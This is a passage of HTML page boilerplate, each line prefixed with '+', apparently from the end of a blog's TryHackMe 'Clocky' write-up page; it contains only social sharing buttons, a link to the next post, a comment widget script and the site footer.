+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f04%2fthm-clocky%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg role="img" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+    <title>X</title>
+    <path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z" stroke="#ffffff"/>
+</svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=THM%3a%20Clocky&amp;caption=THM%3a%20Clocky&amp;canonicalUrl=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f04%2fthm-clocky%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=THM%3a%20Clocky&amp;body=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f04%2fthm-clocky%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f04%2fthm-clocky%2f&amp;media=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f04%2fthm-clocky%2f;description=THM%3a%20Clocky" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f04%2fthm-clocky%2f&amp;title=THM%3a%20Clocky&amp;summary=THM%3a%20Clocky&amp;source=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f04%2fthm-clocky%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f04%2fthm-clocky%2f&amp;resubmit=true&amp;title=THM%3a%20Clocky" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f04%2fthm-clocky%2f;title=THM%3a%20Clocky" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=THM%3a%20Clocky%20https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f04%2fthm-clocky%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f04%2fthm-clocky%2f&amp;t=THM%3a%20Clocky" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=THM%3a%20Clocky&amp;url=https%3a%2f%2fscorpiosec.com%2fposts%2f2024%2f04%2fthm-clocky%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://scorpiosec.com/posts/2024/04/htb-codify/">
+                    <span class="button__text">HTB: Codify</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+    <script src="https://utteranc.es/client.js"
+            repo="K-Scorpio/scorpiosec"
+            label="comment"
+            issue-term="pathname"
+            theme="github-dark"
+            crossorigin="anonymous"
+            async>
+    </script>
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            
+            
+            
+            <span>K-Scorpio</span>
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Theme - <a href="https://themes.gohugo.io/themes/hugo-theme-hello-friend-ng/">Hello Friend NG</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://scorpiosec.com/bundle.min.ac2a4bcaed631ec2dc154407be7f09fc28da37de71fae6dee6711b2a3d1622770f87d3cda22c460e9a68ff619bdb1dd75cb7a5d33f159a54e419736cc4541087.js" integrity="sha512-rCpLyu1jHsLcFUQHvn8J/CjaN95x&#43;ube5nEbKj0WIncPh9PNoixGDppo/2Gb2x3XXLel0z8VmlTkGXNsxFQQhw=="></script>
+
+
+
+
+    </body>
+</html>
